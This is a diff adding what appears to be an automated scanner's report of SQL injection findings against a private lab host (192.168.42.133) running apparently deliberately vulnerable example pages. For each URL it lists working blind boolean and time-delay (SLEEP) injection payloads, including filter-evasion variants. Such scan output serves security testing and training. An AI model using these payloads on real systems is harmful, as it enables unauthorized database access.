@@ -1,0 +1,94 @@
+目标：http://192.168.42.133 (GET)
+
+---
+URL:http://192.168.42.133/sqli/example2.php (GET)
+漏洞名称: blind sqli
+Query: {'name': 'root'}
+Payload: '	and	'87549'='87549
+'	and	'45312'='45312
+'	or	82999=82999#
+'	and	'7551'='7552
+---
+---
+URL:http://192.168.42.133/sqli/example1.php (GET)
+漏洞名称: blind sqli
+Query: {'name': 'root'}
+Payload: '	and	'87549'='87549
+'	and	'45312'='45312
+'	or	82999=82999#
+'	and	'7551'='7552
+---
+---
+URL:http://192.168.42.133/sqli/example4.php (GET)
+漏洞名称: blind sqli
+Query: {'id': '2'}
+Payload: 	and	49937=49937
+	and	73732=73732
+	or	90355=90355#
+	and	14530=14531
+---
+---
+URL:http://192.168.42.133/sqli/example5.php (GET)
+漏洞名称: blind sqli
+Query: {'id': '2'}
+Payload: 	and	49937=49937
+	and	73732=73732
+	or	90355=90355#
+	and	14530=14531
+---
+---
+URL:http://192.168.42.133/sqli/example3.php (GET)
+漏洞名称: blind sqli
+Query: {'name': 'root'}
+Payload: '/**/and/**/'97488'='97488
+'/**/and/**/'38312'='38312
+'/**/or/**/41817=41817#
+'/**/and/**/'79584'='79585
+---
+---
+URL:http://192.168.42.133/sqli/example6.php (GET)
+漏洞名称: blind sqli
+Query: {'id': '2'}
+Payload: 	and	49937=49937
+	and	73732=73732
+	or	90355=90355#
+	and	14530=14531
+---
+---
+URL:http://192.168.42.133/sqli/example7.php (GET)
+漏洞名称: blind sqli
+Query: {'id': '2'}
+Payload: 
+and
+87847=87847
+
+and
+74028=74028
+
+or
+55167=55167#
+
+and
+77915=77916
+---
+---
+URL:http://192.168.42.133/xml/example2.php (GET)
+漏洞名称: blind sqli
+Query: {'name': 'hacker'}
+Payload: '+and+'76080'='76080
+'+and+'96193'='96193
+'+or+48131=48131#
+'+and+'56148'='56149
+---
+---
+URL:http://192.168.42.133/sqli/example9.php (GET)
+漏洞名称: time delay sqli vuln
+Query: {'order': 'name'}
+Payload:  or SLEEP(3);-- 
+---
+---
+URL:http://192.168.42.133/sqli/example8.php (GET)
+漏洞名称: time delay sqli vuln
+Query: {'order': 'name'}
+Payload: ` or SLEEP(3);-- 
+---
